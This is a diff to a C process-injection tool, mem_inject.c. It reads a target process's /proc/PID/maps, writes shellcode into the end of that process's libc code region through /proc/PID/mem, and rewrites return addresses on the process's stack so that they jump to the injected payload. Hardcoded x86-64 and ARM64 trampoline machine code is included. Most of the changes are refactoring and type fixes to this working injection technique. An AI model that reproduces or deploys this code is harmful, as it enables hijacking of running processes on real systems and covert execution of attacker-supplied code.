@@ -3,22 +3,79 @@
 #include <stdlib.h>
 #include <unistd.h>
 
-#include "shellcode.h"
 #include "mem_inject.h"
+#include "shellcode.h"
 
 #define DEBUG 1
 #define DELAY 8
 
+int file_to_maps(maps_t *mapsfile, unsigned char *filebuff, long total) {
+    long k = 0;
+    long count = 0;
+    unsigned int stage = 0;
+    for (long i = 0; i < total - 1; i++) {
+        if (filebuff[i] == '-' && stage == 0) {
+            mapsfile[count].str_start[k] = '\x0';
+            mapsfile[count].addr_start = strtoul(mapsfile[count].str_start, NULL, 16);
+            k = 0;
+            stage = 1;
+        } else if (filebuff[i] == ' ' && stage != 6) {
+            if (stage == 1) {
+                mapsfile[count].str_finish[k] = '\x0';
+                mapsfile[count].addr_finish = strtoul(mapsfile[count].str_finish, NULL, 16);
+            } else if (stage == 2) {
+                mapsfile[count].perms[k] = '\x0';
+            } else if (stage == 3) {
+                mapsfile[count].offset[k] = '\x0';
+            } else if (stage == 4) {
+                mapsfile[count].dev[k] = '\x0';
+            } else if (stage == 5) {
+                mapsfile[count].inode[k] = '\x0';
+            }
+            k = 0;
+            stage += 1;
+        } else if (filebuff[i] == '\n') {
+            mapsfile[count].pathname[k] = '\x0';
+            k = 0;
+            stage = 0;
+            count += 1;
+        } else if (stage == 0) {
+            mapsfile[count].str_start[k] = filebuff[i];
+            k += 1;
+        } else if (stage == 1) {
+            mapsfile[count].str_finish[k] = filebuff[i];
+            k += 1;
+        } else if (stage == 2) {
+            mapsfile[count].perms[k] = filebuff[i];
+            k += 1;
+        } else if (stage == 3) {
+            mapsfile[count].offset[k] = filebuff[i];
+            k += 1;
+        } else if (stage == 4) {
+            mapsfile[count].dev[k] = filebuff[i];
+            k += 1;
+        } else if (stage == 5) {
+            mapsfile[count].inode[k] = filebuff[i];
+            k += 1;
+        } else if (stage == 6) {
+            if (filebuff[i] != ' ') {
+                mapsfile[count].pathname[k] = filebuff[i];
+                k += 1;
+            }
+        }
+    }
+    return 0;
+}
 
-int maps_parser(unsigned int pid, maps_t **mfile, size_t *mapcount) {
+int maps_parser(int pid, maps_t **mfile, long *mapcount) {
     unsigned char filepath[100];
 
-    sprintf(filepath, "/proc/%d/maps\x00", pid);
+    sprintf((char *)filepath, "/proc/%d/maps", pid);
     #if DEBUG
     printf("current path is %s\n", filepath);
     #endif
 
-    FILE *f = fopen(filepath, "rb");
+    FILE *f = fopen((char *)filepath, "rb");
     if (!f) {
         #if DEBUG
         printf("[!] file not found\n");
@@ -27,7 +84,7 @@ int maps_parser(unsigned int pid, maps_t **mfile, size_t *mapcount) {
     }
 
     unsigned int flag = 1;
-    size_t total = 0;
+    long total = 0;
     *mapcount = 0;
 
     while (1) {
@@ -44,97 +101,40 @@ int maps_parser(unsigned int pid, maps_t **mfile, size_t *mapcount) {
     unsigned char *filebuff = malloc(total);
     *mfile = malloc(*mapcount * sizeof(maps_t));
 
-    printf("count is %d\n", *mapcount);
+    printf("count is %ld\n", *mapcount);
 
     fseek(f, 0, SEEK_SET);
 
-    for (size_t i = 0; i < total - 1; i++) {
+    for (long i = 0; i < total - 1; i++) {
         filebuff[i] = fgetc(f);
         if (feof(f)) {
             break;
         }
     }
 
-    int file_to_maps(maps_t *mapsfile, unsigned char *filebuff) {
-        size_t k = 0;
-        size_t count = 0;
-        unsigned int stage = 0;
-        for (size_t i = 0; i < total - 1; i++) {
-            if (filebuff[i] == '-' && stage == 0) {
-                mapsfile[count].str_start[k] = '\x0';
-                mapsfile[count].addr_start = strtoul(mapsfile[count].str_start, NULL, 16);
-                k = 0;
-                stage = 1;
-            } else if (filebuff[i] == ' ' && stage != 6) {
-                if (stage == 1) {
-                    mapsfile[count].str_finish[k] = '\x0';
-                    mapsfile[count].addr_finish = strtoul(mapsfile[count].str_finish, NULL, 16);
-                } else if (stage == 2) {
-                    mapsfile[count].perms[k] = '\x0';
-                } else if (stage == 3) {
-                    mapsfile[count].offset[k] = '\x0';
-                } else if (stage == 4) {
-                    mapsfile[count].dev[k] = '\x0';
-               } else if (stage == 5) {
-                    mapsfile[count].inode[k] = '\x0';
-                }
-                k = 0;
-                stage += 1;
-            } else if (filebuff[i] == '\n') {
-                mapsfile[count].pathname[k] = '\x0';
-                k = 0;
-                stage = 0;
-                count += 1;
-            } else if (stage == 0) {
-                mapsfile[count].str_start[k] = filebuff[i];
-                k += 1;
-            } else if (stage == 1) {
-                mapsfile[count].str_finish[k] = filebuff[i];
-                k += 1;
-            } else if (stage == 2) {
-                mapsfile[count].perms[k] = filebuff[i];
-                k += 1;
-            } else if (stage == 3) {
-                mapsfile[count].offset[k] = filebuff[i];
-                k += 1;
-            } else if (stage == 4) {
-                mapsfile[count].dev[k] = filebuff[i];
-                k += 1;
-            } else if (stage == 5) {
-                mapsfile[count].inode[k] = filebuff[i];
-                k += 1;
-            } else if (stage == 6) {
-                if (filebuff[i] != ' ') {
-                    mapsfile[count].pathname[k] = filebuff[i];
-                    k += 1;
-                }
-            }
-        }
-        return 0;
-    }
-
-    file_to_maps(*mfile, filebuff);
+    file_to_maps(*mfile, filebuff, total);
     free(filebuff);
     return 0;
 }
 
-int machinecode_from_char(unsigned char *code, size_t count) {
+int machinecode_from_char(unsigned char *code, long count) {
     #if __linux__
     printf("\033[01;30mmachine code:\033[00m ");
     #else
     printf("machine code: ");
     #endif
-    for (size_t i = 0; i < count; i++) {
+    for (long i = 0; i < count; i++) {
         printf("%02hhx ", code[i]);
     }
     printf("\n");
+    return 0;
 }
 
-int get_num_from_maps_by_name(unsigned char *mapsname, size_t mapsize, int n, unsigned char *name, size_t size, int *num) {
+int get_num_from_maps_by_name(unsigned char *mapsname, long mapsize, int n, unsigned char *name, long size, int *num) {
     int matched = 0;
-    for (size_t i = 0; i < mapsize; i++) {
+    for (long i = 0; i < mapsize; i++) {
         matched = 0;
-        for (size_t j = 0; j < size - 1; j++) {
+        for (long j = 0; j < size - 1; j++) {
             if (mapsname[i+j] == name[j]) {
                 matched += 1;
             }
@@ -148,7 +148,28 @@ int get_num_from_maps_by_name(unsigned char *mapsname, size_t mapsize, int n, un
     return -1;
 }
 
-int search_addr_in_mem(unsigned char *memory, size_t memsize, maps_t *mapsfile, int *exec_nums, size_t exec_size, size_t offset, link_t **memtable, size_t *memtable_count) {
+long addr_in_mem(link_t *pointer_to_addr, maps_t *mapsfile, unsigned char *memory, long exec_size, long memsize, int *exec_nums, long offset) {
+    unsigned int a, b;
+    unsigned long addr;
+    long acc = 0;
+    for (long n = 0; n < exec_size; n++) {
+        for (long i = 0; i < memsize - sizeof(addr); i++) {
+            a = memory[i] | (memory[i+1] << 8) | (memory[i+2] << 16) | (memory[i+3] << 24);
+            b = memory[i+4] | (memory[i+5] << 8) | (memory[i+6] << 16) | (memory[i+7] << 24);
+            addr = (unsigned long)b << 32 | a & 0xFFFFFFFFL;
+            if (mapsfile[exec_nums[n]].addr_start < addr && addr < mapsfile[exec_nums[n]].addr_finish) {
+                if (pointer_to_addr != NULL) {
+                    pointer_to_addr[acc].pointer = i + offset;
+                    pointer_to_addr[acc].value = addr;
+                }
+                acc += 1;
+            }
+        }
+    }
+    return acc;
+}
+
+int search_addr_in_mem(unsigned char *memory, long memsize, maps_t *mapsfile, int *exec_nums, long exec_size, long offset, link_t **memtable, long *memtable_count) {
     unsigned int a;
     unsigned int b;
     unsigned long addr;
@@ -158,53 +179,36 @@ int search_addr_in_mem(unsigned char *memory, size_t memsize, maps_t *mapsfile, 
     a = memory[0+sizeof(unsigned long)] | (memory[1+sizeof(unsigned long)] << 8) | (memory[2+sizeof(unsigned long)] << 16) | (memory[3+sizeof(unsigned long)] << 24);
     b = memory[4+sizeof(unsigned long)] | (memory[5+sizeof(unsigned long)] << 8) | (memory[6+sizeof(unsigned long)] << 16) | (memory[7+sizeof(unsigned long)] << 24);
     clear_count = (unsigned long)b << 32 | a & 0xFFFFFFFFL;
-    printf("cleared_count is %d\n", clear_count);
+    printf("cleared_count is %lu\n", clear_count);
 
     // init as zeros
     if (clear_count > 0) {
-        size_t bytecount = (clear_count + 1) * 2 * sizeof(unsigned long);
-        for (size_t i = 0; i < bytecount; i++) {
+        long bytecount = (clear_count + 1) * 2 * sizeof(unsigned long);
+        for (long i = 0; i < bytecount; i++) {
             memory[i] = 0;
         }
     }
 
-    size_t addr_in_mem(link_t *pointer_to_addr) {
-        size_t acc = 0;
-        for (size_t n = 0; n < exec_size; n++) {
-            for (size_t i = 0; i < memsize - sizeof(addr); i++) {
-                a = memory[i] | (memory[i+1] << 8) | (memory[i+2] << 16) | (memory[i+3] << 24);
-                b = memory[i+4] | (memory[i+5] << 8) | (memory[i+6] << 16) | (memory[i+7] << 24);
-                addr = (unsigned long)b << 32 | a & 0xFFFFFFFFL;
-                if (mapsfile[exec_nums[n]].addr_start < addr && addr < mapsfile[exec_nums[n]].addr_finish) {
-                    if (pointer_to_addr != NULL) {
-                        pointer_to_addr[acc].pointer = i + offset;
-                        pointer_to_addr[acc].value = addr;
-                    }
-                    acc += 1;
-                }
-            }
-        }
-        return acc;
-    }
-    *memtable_count = addr_in_mem(NULL);
+    *memtable_count = addr_in_mem(NULL, mapsfile, memory, exec_size, memsize, exec_nums, offset);
     *memtable = malloc(*memtable_count * sizeof(link_t));
-    addr_in_mem(*memtable);
+    //addr_in_mem(*memtable);
+    addr_in_mem(*memtable, mapsfile, memory, exec_size, memsize, exec_nums, offset);
     return 0;
 }
 
-int restore_addr_in_mem(FILE *f, link_t *memtable, size_t memtable_count) {
-    for (size_t i = 0; i < memtable_count; i++) {
+int restore_addr_in_mem(FILE *f, link_t *memtable, long memtable_count) {
+    for (long i = 0; i < memtable_count; i++) {
         fseek(f, memtable[i].pointer, SEEK_SET);
-        size_t count = fwrite(&memtable[i].value, 1, sizeof(unsigned long), f);
+        long count = fwrite(&memtable[i].value, 1, sizeof(unsigned long), f);
         printf("[Restored] 0x%lx -> 0x%lx\n", memtable[i].pointer, memtable[i].value);
     }
     return 0;
 }
 
-int spoof_addr_in_mem(FILE *f, link_t *memtable, size_t memtable_count, unsigned long stackoffset, unsigned long offset) {
-    unsigned long shift = 0;
-    size_t count = 0;
-    for (size_t i = 0; i < memtable_count; i++) {
+int spoof_addr_in_mem(FILE *f, link_t *memtable, long memtable_count, unsigned long stackoffset, unsigned long offset) {
+    long shift = 0;
+    long count = 0;
+    for (long i = 0; i < memtable_count; i++) {
         fseek(f, stackoffset, SEEK_SET);
         count = fwrite(&memtable[i].pointer, 1, sizeof(unsigned long), f);
         stackoffset += sizeof(unsigned long);
@@ -218,11 +222,11 @@ int spoof_addr_in_mem(FILE *f, link_t *memtable, size_t memtable_count, unsigned
     return 0;
 }
 
-int exec_code(unsigned int pid, maps_t *mapsfile, size_t mapcount, unsigned char *ret_code, size_t ret_size, unsigned const char *code, size_t code_size) {
+int exec_code(unsigned int pid, maps_t *mapsfile, long mapcount, unsigned char *ret_code, long ret_size, unsigned const char *code, long code_size) {
     unsigned char filepath[100];
-    sprintf(filepath, "/proc/%d/mem\x00", pid);
+    sprintf((char *)filepath, "/proc/%d/mem", pid);
 
-    FILE *f2 = fopen(filepath, "r+b");
+    FILE *f2 = fopen((char *)filepath, "r+b");
     if (!f2) {
         #if DEBUG
         printf("[!] file not found\n");
@@ -230,23 +234,23 @@ int exec_code(unsigned int pid, maps_t *mapsfile, size_t mapcount, unsigned char
         return -1;
     }
 
-    size_t count;
-    size_t matched;
+    long count;
+    long matched;
     unsigned char libcname[] = "libc";
     unsigned char stackname[] = "[stack]";
     unsigned char perms[] = "x";
 
-    size_t exec_size = 0;
+    long exec_size = 0;
     int *exec_nums = malloc(mapcount * sizeof(int));
     int libc_num = -1;
     int stack_num = -1;
 
     for (int n = 0; n < mapcount; n++) {
-        if (get_num_from_maps_by_name(mapsfile[n].perms, sizeof(mapsfile[n].perms), n, perms, sizeof(perms), &exec_nums[exec_size]) == 0) {
+        if (get_num_from_maps_by_name((unsigned char *)mapsfile[n].perms, sizeof(mapsfile[n].perms), n, perms, sizeof(perms), &exec_nums[exec_size]) == 0) {
             exec_size += 1;
-            get_num_from_maps_by_name(mapsfile[n].pathname, sizeof(mapsfile[n].pathname), n, libcname, sizeof(libcname), &libc_num);
+            get_num_from_maps_by_name((unsigned char *)mapsfile[n].pathname, sizeof(mapsfile[n].pathname), n, libcname, sizeof(libcname), &libc_num);
         }
-        get_num_from_maps_by_name(mapsfile[n].pathname, sizeof(mapsfile[n].pathname), n, stackname, sizeof(stackname), &stack_num);
+        get_num_from_maps_by_name((unsigned char *) mapsfile[n].pathname, sizeof(mapsfile[n].pathname), n, stackname, sizeof(stackname), &stack_num);
     }
     exec_nums[exec_size] = -1;
     printf("libc %d\n", libc_num);
@@ -261,7 +265,7 @@ int exec_code(unsigned int pid, maps_t *mapsfile, size_t mapcount, unsigned char
         return -1;
     }
 
-    size_t stacksize = mapsfile[stack_num].addr_finish - mapsfile[stack_num].addr_start;
+    long stacksize = mapsfile[stack_num].addr_finish - mapsfile[stack_num].addr_start;
     unsigned char *buffer = malloc(sizeof(char) * stacksize);
 
     fseek(f2, mapsfile[stack_num].addr_start, SEEK_SET);
@@ -271,14 +275,14 @@ int exec_code(unsigned int pid, maps_t *mapsfile, size_t mapcount, unsigned char
     #endif
 
     link_t *memtable;
-    size_t memtable_count = 0;
+    long memtable_count = 0;
     search_addr_in_mem(buffer, stacksize, mapsfile, exec_nums, exec_size, mapsfile[stack_num].addr_start, &memtable, &memtable_count);
 
     #if DEBUG
-    printf("memcount is %d\n", memtable_count);
+    printf("memcount is %ld\n", memtable_count);
     #endif
 
-    size_t backupsize = code_size + ret_size + sizeof(unsigned long int);
+    long backupsize = code_size + ret_size + sizeof(unsigned long int);
     unsigned long offset = mapsfile[libc_num].addr_finish - backupsize;
     unsigned long offset2 = offset + code_size;
     unsigned char *backup = malloc(sizeof(char) * backupsize);
@@ -286,7 +290,7 @@ int exec_code(unsigned int pid, maps_t *mapsfile, size_t mapcount, unsigned char
     fseek(f2, offset, SEEK_SET);
     count = fread(backup, 1, backupsize, f2);
     #if DEBUG
-    printf("backup count is %d\n", count);
+    printf("backup count is %ld\n", count);
     #endif
 
     // Spoofing libc
@@ -307,7 +311,7 @@ int exec_code(unsigned int pid, maps_t *mapsfile, size_t mapcount, unsigned char
     // Restoring stack (partial)
     //sleep(DELAY);
     //fseek(f2, mapsfile[stack_num].addr_start, SEEK_SET);
-    //size_t zeroes_size = 2 * (memtable_count + 1) * sizeof(unsigned long);
+    //long zeroes_size = 2 * (memtable_count + 1) * sizeof(unsigned long);
     //count = fwrite(buffer, 1, zeroes_size, f2);
     //#if DEBUG
     //printf("[Restored] stack (count %d)\n", count);
@@ -345,10 +349,14 @@ int main(int argc, const char *argv[]) {
     printf("current pid is %d\n", pid);
     #endif
 
+    #ifdef __ARM_ARCH
+    unsigned char ret_code[] = {0xe1, 0x3, 0x1f, 0xf8, 0xe2, 0x83, 0x1e, 0xf8, 0xe3, 0x3, 0x1e, 0xf8, 0xe4, 0x83, 0x1d, 0xf8, 0xe5, 0x3, 0x1d, 0xf8, 0xe6, 0x83, 0x1c, 0xf8, 0xe7, 0x3, 0x1c, 0xf8, 0xe8, 0x83, 0x1b, 0xf8, 0xe9, 0x3, 0x1b, 0xf8, 0xea, 0x83, 0x1a, 0xf8, 0xea, 0x3, 0x0, 0x91, 0x4a, 0x21, 0x0, 0xd1, 0x2a, 0x0, 0x0, 0x94, 0xc8, 0xb, 0x80, 0xd2, 0x1, 0x0, 0x0, 0xd4, 0xc4, 0x3, 0x40, 0xf9, 0x85, 0x0, 0x40, 0xf9, 0x63, 0x0, 0x3, 0xca, 0x83, 0x0, 0x0, 0xf9, 0x83, 0x4, 0x40, 0xf9, 0x6, 0x1, 0x80, 0xd2, 0x6, 0x0, 0x0, 0x94, 0x48, 0x1, 0x0, 0xf9, 0xfe, 0x3, 0x8, 0xaa, 0xbf, 0x0, 0x0, 0xf1, 0x21, 0x1, 0x0, 0x54, 0x20, 0x40, 0x0, 0x94, 0x63, 0x4, 0x0, 0xd1, 0xc6, 0x20, 0x0, 0x91, 0x87, 0x68, 0x66, 0xf8, 0xc6, 0x20, 0x0, 0x91, 0x88, 0x68, 0x66, 0xf8, 0xff, 0x0, 0xa, 0xeb, 0xa0, 0xfe, 0xff, 0x54, 0xbf, 0x0, 0x0, 0xf1, 0x40, 0x0, 0x0, 0x54, 0xe8, 0x0, 0x0, 0xf9, 0x7f, 0x0, 0x0, 0xf1, 0xa1, 0xfe, 0xff, 0x54, 0xfe, 0x83, 0x1f, 0xf8, 0xe0, 0x3, 0x5, 0xaa, 0xe1, 0x3, 0x5f, 0xf8, 0xe2, 0x83, 0x5e, 0xf8, 0xe3, 0x3, 0x5e, 0xf8, 0xe4, 0x83, 0x5d, 0xf8, 0xe5, 0x3, 0x5d, 0xf8, 0xe6, 0x83, 0x5c, 0xf8, 0xe7, 0x3, 0x5c, 0xf8, 0xe8, 0x83, 0x5b, 0xf8, 0xe9, 0x3, 0x5b, 0xf8, 0xea, 0x83, 0x5a, 0xf8, 0x1f, 0x0, 0x0, 0xf1, 0x0, 0x0, 0x1f, 0xd6, 0xc0, 0x3, 0x5f, 0xd6, 0xe6, 0x3, 0x1e, 0xaa, 0xd8, 0xff, 0xff, 0x97};
+    # else
     unsigned char ret_code[] = {0xeb, 0x68, 0x50, 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x48, 0x8b, 0x44, 0x24, 0x38, 0x48, 0x8b, 0x0, 0x48, 0x31, 0xc9, 0x48, 0x8b, 0x18, 0x48, 0x89, 0x8, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc6, 0x38, 0x48, 0x8b, 0x48, 0x8, 0x48, 0x83, 0xc0, 0x10, 0xeb, 0x8, 0x48, 0x89, 0x16, 0x48, 0x85, 0xdb, 0x74, 0x23, 0x48, 0xff, 0xc9, 0x48, 0x8b, 0x38, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x8b, 0x10, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x85, 0xdb, 0x74, 0x3, 0x48, 0x89, 0x17, 0x48, 0x31, 0xf7, 0x74, 0xda, 0x48, 0x85, 0xc9, 0x75, 0xdd, 0x48, 0x89, 0x5e, 0xf8, 0x48, 0x85, 0xdb, 0x5f, 0x5e, 0x5a, 0x59, 0x5b, 0x58, 0x75, 0x4, 0x48, 0x83, 0xc4, 0x8, 0xc3, 0xe8, 0x93, 0xff, 0xff, 0xff};
+    # endif
 
     maps_t *mapsfile = NULL;
-    size_t mapcount;
+    long mapcount;
     maps_parser(pid, &mapsfile, &mapcount);
     exec_code(pid, mapsfile, mapcount, ret_code, sizeof(ret_code), shellcode, sizeof(shellcode));
     if (mapsfile != NULL) {
@@ -356,6 +364,3 @@ int main(int argc, const char *argv[]) {
     }
     return -1;
 }
-
-
-// gcc mem_inject.c -o mem_inject
